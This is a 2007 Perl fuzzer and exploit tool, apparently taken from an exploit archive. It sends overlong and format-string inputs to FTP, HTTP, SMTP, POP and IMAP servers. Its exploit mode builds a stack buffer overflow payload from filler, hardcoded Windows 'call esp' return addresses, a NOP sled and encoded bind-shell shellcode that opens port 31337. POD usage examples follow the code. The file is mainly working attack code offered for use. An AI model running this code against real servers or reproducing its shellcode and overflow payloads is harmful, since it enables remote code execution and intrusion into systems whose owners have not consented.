#B0ffuzzer v1.0  pang0 (c) 13 April 2007
#pang0@tcbilisim.org // www.TcBilisim.Org
#shootz: o.g. // Stansar  // Adriaan // x0
#tsk: GODAttach (cha0s) // Crx
use IO::Socket;
use Getopt::Std;
getopts("UvT:P:u:p:t:m:s:i:f:er:", \%mod);
$SIG{INT}=\&exitz;
$return_addres; #$return_addres = 0xdeadbeef;
print "
\t  B0ffuzzer v1.0 by pang0 (c) 2007
\t        www.tcbilisim.org
\t     HTTP/FTP/SMTP/POP/IMAP\n
";
if(!defined($mod{T}) or !defined($mod{m})){
print "
-U   : UDP Mode
-v   : Verbose Mode
-T   : Target*
-P   : Port Number(default: mode port)*
-u   : UserName(Optional)*
-p   : Pass(Optional)*
-t   : TimeOut(Optional)*
-m   : Fuzzer Mode*
-s   : String Type [format - overflow]*
-i   : interval of array (Optional)*
-f   : Functions*
-e   : Exploit Mode [for win bofoverexp]
-r   : Return Addr.(Optional)(for -e func)*
Return Targets: xp1 - xp2 - sp12003 - winnt
Fuzzer Modez: http/ftp/smtp/pop/imap
Do You Want More Exam Read POD
exam : perl $0 -v -P 21 -m FTP -t 7 -T 127.0.0.1 -s overflow -r BBBB
exam : perl $0 -v -m HTTP -T 127.0.0.1 -i 2570-2900 -s format
exam : perl $0 -v -e -m FTP -T 127.0.0.1 -f \"USER~,PASS wtf\" -P 21 -i 313 -r xp2
* : Need Argv
";
exit
}
%eips = (    #thx to metasploit 4 0pcodez (All English)
xp1 => "\x20\x29\xd5\x77",#0x77d52920   call esp
xp2 => "\x97\xE6\x91\x7C",#0x7c91e697   call esp
winnt => "\xED\x29\xF1\x77",#0x77f129ed  call esp
sp12003 => "\x6C\x86\xC0\x71" #0x71c0866c call esp
);
%port = (
ftp => 21,
http => 80,
smtp => 25,
pop => 110,
imap => 143
);
%check = (
ftp_user  => "USER %s\r\n",
ftp_pass => "PASS %s\r\n",
pop_user => "USER %s\r\n",
pop_pass => "PASS %s\r\n",
imap_user => "a001 LOGIN %s ",
imap_pass => "%s\r\n"
);
%login = (
ok_ftp => 230,
no_ftp => 530,
ok_imap => "A001 OK",
no_imap => "A001 NO",
ok_pop => "+OK logged",
no_pop => "-ERR"
);
#WindowsBindShell 31337 thx metasploit & Don't Change Shellcode!
my $shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x49\x49\x49\x48\x49\x49\x49\x49\x51\x5a\x6a\x61".
"\x58\x50\x30\x41\x30\x42\x6b\x42\x41\x71\x41\x42\x32\x42\x41\x32".
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4a\x49\x6b\x4c\x70".
"\x6a\x7a\x4b\x32\x6d\x48\x68\x7a\x59\x6b\x4f\x4b\x4f\x79\x6f\x53".
"\x50\x6e\x6b\x42\x4c\x75\x74\x74\x64\x6e\x6b\x73\x75\x47\x4c\x6c".
"\x4b\x53\x4c\x45\x55\x33\x48\x67\x71\x5a\x4f\x4e\x6b\x32\x6f\x65".
"\x48\x6c\x4b\x51\x4f\x77\x50\x35\x51\x6a\x4b\x63\x79\x4c\x4b\x57".
"\x44\x6e\x6b\x37\x71\x7a\x4e\x34\x71\x49\x50\x6a\x39\x4e\x4c\x6e".
"\x64\x4f\x30\x52\x54\x57\x77\x4b\x71\x69\x5a\x74\x4d\x35\x51\x58".
"\x42\x78\x6b\x68\x74\x75\x6b\x32\x74\x41\x34\x76\x48\x30\x75\x49".
"\x75\x6e\x6b\x71\x4f\x51\x34\x74\x41\x58\x6b\x52\x46\x4e\x6b\x56".
"\x6c\x42\x6b\x6e\x6b\x53\x6f\x55\x4c\x64\x41\x7a\x4b\x65\x53\x76".
"\x4c\x6c\x4b\x4f\x79\x70\x6c\x71\x34\x65\x4c\x75\x31\x6b\x73\x46".
"\x51\x4b\x6b\x41\x74\x4e\x6b\x51\x53\x50\x30\x4e\x6b\x77\x30\x56".
"\x6c\x6e\x6b\x70\x70\x77\x6c\x6c\x6d\x4e\x6b\x71\x50\x33\x38\x73".
"\x6e\x41\x78\x4c\x4e\x70\x4e\x46\x6e\x7a\x4c\x62\x70\x6b\x4f\x4b".
"\x66\x43\x56\x50\x53\x50\x66\x33\x58\x30\x33\x44\x72\x33\x58\x63".
"\x47\x30\x73\x57\x42\x41\x4f\x66\x34\x4b\x4f\x6e\x30\x75\x38\x78".
"\x4b\x38\x6d\x79\x6c\x37\x4b\x66\x30\x39\x6f\x6e\x36\x41\x4f\x4c".
"\x49\x4d\x35\x33\x56\x4c\x41\x38\x6d\x54\x48\x36\x62\x56\x35\x73".
"\x5a\x56\x62\x49\x6f\x68\x50\x35\x38\x78\x59\x56\x69\x79\x65\x4e".
"\x4d\x70\x57\x39\x6f\x6b\x66\x41\x43\x70\x53\x70\x53\x72\x73\x76".
"\x33\x62\x63\x43\x63\x52\x63\x72\x73\x6b\x4f\x48\x50\x33\x56\x51".
"\x78\x41\x6a\x33\x59\x52\x46\x71\x43\x4d\x59\x4d\x31\x6d\x45\x73".
"\x58\x4f\x54\x77\x6a\x72\x50\x4b\x77\x30\x57\x49\x6f\x48\x56\x51".
"\x7a\x34\x50\x50\x51\x43\x65\x79\x6f\x68\x50\x30\x68\x4e\x44\x6c".
"\x6d\x64\x6e\x38\x69\x33\x67\x6b\x4f\x4e\x36\x32\x73\x53\x65\x49".
"\x6f\x58\x50\x75\x38\x49\x75\x32\x69\x4b\x36\x42\x69\x53\x67\x4b".
"\x4f\x79\x46\x42\x70\x41\x44\x62\x74\x70\x55\x39\x6f\x7a\x70\x4d".
"\x43\x41\x78\x6d\x37\x30\x79\x48\x46\x62\x59\x33\x67\x6b\x4f\x79".
"\x46\x46\x35\x79\x6f\x4e\x30\x75\x36\x43\x5a\x31\x74\x62\x46\x33".
"\x58\x33\x53\x62\x4d\x4c\x49\x7a\x45\x63\x5a\x56\x30\x51\x49\x67".
"\x59\x48\x4c\x6b\x39\x4b\x57\x53\x5a\x67\x34\x6c\x49\x4b\x52\x47".
"\x41\x6b\x70\x4c\x33\x4e\x4a\x6b\x4e\x67\x32\x64\x6d\x6b\x4e\x51".
"\x52\x44\x6c\x4d\x43\x6c\x4d\x72\x5a\x45\x68\x6c\x6b\x4c\x6b\x4c".
"\x6b\x50\x68\x50\x72\x6b\x4e\x68\x33\x52\x36\x4b\x4f\x32\x55\x72".
"\x64\x49\x6f\x4e\x36\x53\x6b\x30\x57\x73\x62\x71\x41\x32\x71\x52".
"\x71\x32\x4a\x45\x51\x31\x41\x32\x71\x56\x35\x70\x51\x39\x6f\x38".
"\x50\x63\x58\x6c\x6d\x39\x49\x47\x75\x7a\x6e\x71\x43\x4b\x4f\x68".
"\x56\x41\x7a\x59\x6f\x6b\x4f\x75\x67\x79\x6f\x78\x50\x4e\x6b\x50".
"\x57\x59\x6c\x6f\x73\x78\x44\x31\x74\x49\x6f\x6a\x76\x36\x32\x4b".
"\x4f\x7a\x70\x30\x68\x58\x70\x6c\x4a\x34\x44\x43\x6f\x31\x43\x69".
"\x6f\x58\x56\x79\x6f\x4e\x30\x61";
@cmd_ftp = (
"ACCT LOL", "APPE LOL", "ALLO LOL", "CWD LOL",
"CEL LOL","DELE LOL","HELP LOL","MDTM LOL",
"MLST LOL","MODE LOL","MKD LOL","MKD LOL\r\nCWD LOL",
"MKD LOL\r\nDELE LOL","MKD LOL\r\nRMD LOL",
"MKD LOL\r\nXRMD LOL","NLST LOL","RETR LOL",
"REST LOL","RNFR LOL","RMD LOL","RNTO LOL",
"RNFR LOL\r\nRNTO LOL","SIZE LOL",
"STRU LOL","STOR LOL","STAT LOL",
"SMNT LOL","SITE LOL","SITE EXEC LOL",
"SITE GROUPS LOL","SITE CDPATH LOL","SITE ALIAS LOL",
"SITE INDEX LOL","SITE MINFO 20001010101010 LOL",
"SITE NEWER 20001010101010 LOL","SITE GPASS LOL",
"SITE GROUP LOL","SITE HELP LOL","SITE IDLE LOL",
"SITE CHMOD LOL","SITE CHMOD LOL LOL","SITE UMASK LOL","TYPE LOL","XRMD LOL","LOL"
);
@cmd_http = (
"GET LOL HTTP/1.1\r\n","GET LOL LOL\r\n","GET / LOL",
"POST LOL HTTP/1.1\r\n","POST / LOL\r\n","POST LOL LOL\r\n",
"HEAD LOL LOL\r\n","HEAD LOL HTTP/1.1\r\n","HEAD / LOL\r\n",
"GET / HTTP/1.1\r\nUser-Agent: LOL\r\n","GET / HTTP/1.1\r\nHost: LOL\r\n",
"GET / HTTP/1.1\r\nAccept: LOL\r\n","GET / HTTP/1.1\r\nAccept-Encoding: LOL\r\n",
"GET / HTTP/1.1\r\nAccept-Language: LOL\r\n","GET / HTTP/1.1\r\nAccept-Charset: LOL\r\n",
"GET / HTTP/1.1\r\nConnection: LOL\r\n","GET / HTTP/1.1\r\nReferer: LOL\r\n",
"GET / HTTP/1.1\r\nAuthorization: LOL\r\n","GET / HTTP/1.1\r\nFrom: LOL\r\n",
"GET / HTTP/1.1\r\nCharge-To: LOL\r\n","GET / HTTP/1.1\r\nAuthorization: LOL\r\n",
"GET / HTTP/1.1\r\nAuthorization: LOL : wtf\r\n","GET / HTTP/1.1\r\nAuthorization: wtf : LOL\r\n",
"GET / HTTP/1.1\r\nAuthorization: LOL : LOL\r\n",
"GET / HTTP/1.1\r\nIf-Modified-Since: LOL\r\n","GET / HTTP/1.1\r\nChargeTo: LOL\r\n",
"GET / HTTP/1.1\r\nPragma: LOL\r\n","GET / HTTP/1.1\r\nLOL\r\n"
);
@cmd_pop = (
"LIST LOL","STAT LOL",
"STAT LOL","NOOP LOL",
"APOP LOL","APOP LOL wtf",
"APOP wtf LOL","APOP LOL LOL",
"RSET LOL","RETR LOL","DELE LOL",
"TOP LOL 1","TOP 1 LOL","UIDL LOL",
"LOL"
);
@cmd_imap = (
"A001 CREATE LOL","FXXZ CHECK LOL",
"LIST LOL","A001 SELECT LOL",
"A001 EXAMINE LOL","A001 CREATE LOL",
"A001 DELETE LOL","A001 RENAME LOL",
"A001 CREATE test\r\nA001RENAME test LOL",
"A001 SUBSCRIBE LOL","A001 UNSUBSCRIBE LOL",
"A001 LIST LOL aa","A001 LIST aa LOL",
"A001 LIST * LOL","A001 LSUB aa LOL",
"A001 LSUB LOL aa \r\n","A001 STATUS LOL",
"A001 STATUS inbox (LOL)\r\n","A001 APPEND LOL",
"A001 SELECT LOL\r\nA001 SEARCH LOL",
"A001 SELECT LOL\r\nA001 FETCH LOL",
"A001 SELECT LOL\r\nA001 FETCH 1:2 LOL",
"A001 SELECT LOL\r\nA001 STORE LOL",
"A001 SELECT LOL\r\nA001 STORE 1:2 LOL",
"A001 SELECT LOL\r\nA001 COPY LOL",
"A001 SELECT LOL\r\nA001 COPY 1:2 LOL",
"A001 SELECT LOL\r\nA001 UID LOL",
"A001 SELECT LOL\r\nA001 UID FETCH LOL",
"A001 UID LOL","A001 CAPABILITY LOL",
"A001 DELETEACL LOL","A001 GETACL LOL",
"A001 LISTRIGHTS LOL","A001 MYRIGHTS LOL",
"A001 LOL","LOL"
);
@cmd_no_pop=@cmd_no_ftp=(
"USER LOL,PASS wtf","USER anonymous,PASS LOL",
"USER LOL,PASS LOL"
);
@cmd_no_imap = (
"A001 LOGIN LOL wtf","A001 LOGIN wtf LOL",
"A001 LOGIN LOL LOL"
);
$mod{m}=~tr/[A-Z]/[a-z]/;
if (!($mod{m}=~/^ftp$|^http$|^imap$|^pop$|^smtp$/i)){
print "Invalid Mode\n";
exit
}
if($mod{u}&&!$mod{p} or !$mod{u}&&$mod{p}){
print "\nMissing Argv. (user and pass error)";
exit
}
#port - proto - timeout
if(defined($mod{P}) && $mod{P}=~/(\d+)/){
$port = $1;
}
else{
$port = $port{$mod{m}};
}
vr("Using Port: $port");
$proto = "tcp";
if(defined($mod{U})){
$proto = "udp"
}
vr("Using Protocol: $proto");
$to = 30;
if(defined($mod{t}) && $mod{t}=~/(\d+)/){
$to = $1
}
vr("Using TimeOut: $to");
if(defined($mod{u} && $mod{p})){
$check_pass = check($mod{T},$mod{m},$mod{u},$mod{p});
if($check_pass==31){
$logged = 0
}
elsif($check_pass==31337){
$logged = 31337
}
}
#port - proto -timeout
if(defined($mod{e})){
exploit($mod{T})
}
if(defined($mod{s}) && $mod{s}=~/^overflow$|^format$/){
if ($mod{s}=~/overflow/){
$string = "\x41";
vr("String Type: Overflow");
}
if ($mod{s}=~/format/){
$string = "%s";
vr("String Type: Format")
}
}
elsif(defined($mod{s})){vr($mod{s} . " <- isn't defined String Type\nSo Using Default: Overflow\n");
$string = "A"
}
else{vr("Using Default: Overflow");$string = "A"}
if(defined($mod{i}) && $mod{i}=~/(\d+)\-(\d+)/){
if($1 > $2){print "$1 Big Than $2 wtf!\n";exit}
for($lol=$1;$lol <= $2;++$lol){
if(defined($mod{r}) && $string eq 'A'){
$array[$aa] = "$string" x ($lol - (length($mod{r})));
$array[$aa] .= $mod{r}
}
else{
$array[$aa] = "$string" x $lol
}
++$aa
}
vr("Char Interval : $1 - $2");
}
if(defined($mod{i}) && $mod{i}=~/(\d+)/){
if(defined($mod{r}) &&  $string eq 'A'){
@array = "$string" x ($1 - length($mod{r})) . $mod{r};
}
else{
@array = $string x $1
}
}
else{
@array = ("$string" x 16, "$string" x 32, "$string" x 64, "$string" x 128, "$string" x 256,
"$string" x 512, "$string" x 1024, "$string" x 2048, "$string" x 4096, "$string" x 8192);
vr("Using Default Char Interval");
}
sub vr{
if(defined($mod{v})){
for(@_){
print($_,"\n");
}
}
};
sub soket{
close($sok);
$sok = IO::Socket::INET->new(PeerAddr => $_[0], PeerPort => $port, Proto => $proto, TimeOut => $to)
or exitz();
}
sub exitz{
if(!$sok){
print "\nHost Doesn't Exitz\n"
}
else{print "\nHost Exited\n"}
if($boflen){
sleep 1;
$lollz = '[BOF=>$boflen]';
$fnc =~s/LOL/$lollz/eg;
print "Last Sended Finger=> $fnc\r\n"
}
exit
}
sub check{
vr("Connecting Server");
$host = shift;
$mode = shift;
soket($host);
$login_ok = $login{"ok_" . $mode};
$login_no = $login{"no_" . $mode};
$check_user = $check{$mode . '_user'};
$check_pass = $check{$mode . '_pass'};
if($mode=~/^ftp$|^imap$|^pop$/i){
vr("Checking Username & Password");
printf $sok "$check_user",$_[0] or &exitz;
sleep 1;
printf $sok "$check_pass",$_[1] or &exitz
}
else{
print "Don't Required Username And Pass For ",$mode;
return 31;
}
while(<$sok>){
if(/^\+$login_ok/i or /^$login_ok/i){
return 31337#;x
}
if(/^$login_no/i){
print "[-] Login Failed\r\n";
exit
}
}
}
sub exploit{
sleep 1;
$host = shift;
$boflen = 0;
#ret
if($return_addres){
$ret = pack('L', $return_addres);
}
elsif(defined($mod{r})){
$mod{r}=~tr/[A-Z]/[a-z]/;
if($mod{r}=~/^xp1$|^xp2$|^winnt$|^sp12003$/){
$ret = $eips{$mod{r}};
}
else{print $mod{r},"Undefined Return Type";exit}
}
else{
$ret = pack(l, 0x7C94EFF3); #0x7C94EFF3  call esp  from turkish winxpprosp2 ntdll.dll
vr("Using Default Ret: 0x7C94EFF3");
}
#ret
#bof  +
if(defined($mod{i}) && $mod{i}=~/(\d+)/){
$nop = "\x41" x $1
}
else{
print "Undefined [Interval of Buffer]";
exit
}
if(defined($mod{f})){
vr("Connecting to $host:$port");
soket($host);
sleep 1;
if($logged){
printf $sok $check{$mod{m} . '_user'},$mod{u} or &exitz;
sleep 1;
printf $sok $check{$mod{m} . '_pass'},$mod{p} or &exitz
}
vr("Connected Sending Evil Func & Shellcode");
for(@funcs = split ',',$mod{f}){
if(/(.*?)\~$/){
$lol = "$1 $nop$ret" . "\x90" x 31 . "$shellcode" . "\x90"x15;
print $sok "$lol\r\n" or &exitz;
sleep 1;
}
else{
print $sok "$_ \r\n" or &exitz;
sleep 1
}
}
}
else{
print "Function isn't Selected";
exit
}
print "Shellcode Sended Check out 31337 port of $host\n";
exit
}
#fuzzer mode
if($mod{m}=~/ftp|imap|pop/ && defined($mod{u} && $mod{p}) or $mod{m} eq 'http'){
$cmd = "cmd_" . $mod{m};
}
elsif($mod{m} eq 'smtp'){
print "\r\nThis Mode Must Be Contain an e-mail Addres\r\nAddres =>";
chop($mail = <STDIN>);
$cmd = "cmd_smtp";
if(!$mail){print "Dont Trick With Me"; exit}
}
else{
$cmd = "cmd_no_" . $mod{m};
$amk_perl = 31337;
}
@cmd_smtp = ( #perl is very poor!
"EXPN LOL","EHLO LOL","MAIL FROM: LOL",
"MAIL FROM: <LOL> LOL","MAIL FROM: <LOL> RET=LOL",
"MAIL FROM: <LOL> ENVID=LOL","ETRN LOL",
"ETRN \@LOL","MAIL FROM: <LOL>\r\nRCPT TO: <LOL>",
"MAIL FROM: <LOL>\r\nRCPT TO: <LOL> LOL",
"MAIL FROM: <LOL>\r\nRCPT TO: <LOL> NOTIFY=LOL",
"MAIL FROM: <LOL>\r\nRCPT TO: <LOL> ORCPT=LOL",
"HELP LOL","VRFY LOL","RSET LOL","AUTH mechanism LOL",
"LOL","MAIL FROM: <$mail>\r\nRCPT TO: <$mail> LOL",
"MAIL FROM: <$mail>\r\nRCPT TO: <$mail> NOTIFY=LOL",
"MAIL FROM: <$mail>\r\nRCPT TO: <$mail> ORCPT=LOL",
"MAIL FROM: <$mail> LOL","MAIL FROM: <$mail> RET=LOL",
"MAIL FROM: <$mail> ENVID=LOL","ETRN LOL",
"MAIL FROM: <LOL\@LOL>\r\nRCPT TO: <LOL\@LOL> LOL",
"MAIL FROM: <LOL\@LOL>\r\nRCPT TO: <LOL\@LOL> NOTIFY=LOL",
"MAIL FROM: <LOL\@LOL>\r\nRCPT TO: <LOL\@LOL> ORCPT=LOL",
"MAIL FROM: <LOL\@LOL> LOL","MAIL FROM: <LOL\@LOL> RET=LOL",
"MAIL FROM: <LOL\@LOL> ENVID=LOL","ETRN LOL",
"MAIL FROM: <LOL\@LOL>\r\nRCPT TO: <LOL\@LOL>"
);
for $func (@$cmd){
$fnc = $func;
$amkarr = "";
$amk = 0;
for $arr (@array){
soket($mod{T});
if($logged){
printf $sok $check{$mod{m} . '_user'},$mod{u},"\r\n" or &exitz;
sleep 1;
printf $sok $check{$mod{m} . '_pass'},$mod{p},"\r\n" or &exitz;
sleep 1;
}
$t = "\t";
if($amk_perl){
$fnc=~s/\,/$t/eg
}
if(!$amk){
$boff = "[BOF=>" . length($arr) . "]";
$func=~s/LOL/$arr/eg;
$fnc=~s/LOL/$boff/eg;
print "$fnc"
}
else{
$func=~s/$amk/$arr/eg;
print "->" . length($arr) . "\r\n" ;
}
$amk = $arr;
if($amk_perl){
@muciorecebicci = split ',',$func;
for (@muciorecebicci){
print $sok "$_\r\n";
sleep 1;
}
}
else{
print $sok "$func\r\n" or &exitz;
}
$boflen = length($arr) . "\n";
}
print "\r\n"
}
__END__

=head1 Description

Basic Buffer Overfl0w & Format String Tester
Coded For Security!

=head1 Functions

 -U  => Use UDP Protocol (boolean flag)
 -v  => Use Verbose Mode (boolean flag)
 -T  => Define To Target (Need Arg)
 -P  => Define To TargetPort (If u r not defined this func[Using Default ModezPort])
 -u  => Define UserName To Login Server[Optional]
 -p  => Define Pass To Login Server[Optional]
 -t  => Define TimeOut For Socket [If Not Defined => 30]
 -m  => Fuzzer Mode [FTP/HTTP/IMAP/POP/SMTP]
 -s  => Define String Type [If Not Defined => overflow]
 -i  => Define Interval Array of Buffer [If Not Defined => Default]
 -f  => Define Functions For Exploit Mode [Need Arg]
 -e  => Exploit Mode(Boolean flag) [for win bofoverexp]
 -r  => Return Addr.(Optional)

=head1 Exams

=over 4

=item Exploit  (-e Function)

 If U want Define to Bof Function Plz Add to end array => "~"
 If U want separate to function Plz Add to end array => ","

 perl b0ffuzzer.pl -v -m ftp -T 127.0.0.1 -e -i 831 -f "MKD wtf,CD wtf,DEL~" -u woot -p toow -r xp1
 perl b0ffuzzer.pl -v -m ftp -T 127.0.0.1 -e -i 3331 -f "USER~,PASS wtf" -r xp2

=item Fuzzer Function

 perl b0ffuzzer.pl -m http -T 127.0.0.1 -r BBBB -i 830-840
 perl b0ffuzzer.pl -m imap -T 127.0.0.1 -u wtf -p wtf -v -P 31
 perl b0ffuzzer.pl -v -m ftp -T 127.0.0.1 -P 8021 -s format
 perl b0ffuzzer.pl -U -t 7 -m pop -T 127.0.0.1 -v -s overflow -u woot -p woot
 perl b0ffuzzer.pl -U -m smtp -T 127.0.0.1 -P 26

=head1 Variable

=item Return Address

 xp1     =>  0x77d52920   call esp
 xp2     =>  0x7c91e697   call esp
 winnt   =>  0x77f129ed   call esp
 sp12003 =>  0x71c0866c   call esp

=item Fuzzer Modes

FTP / HTTP / IMAP / POP / SMTP

=head1 Author

       pang0  (c) 2007
 Web Site : www.TcBilisim.Org
 E-Mail   : pang0@tcbilisim.org


=cut 

# nukedx.com [2007-04-16]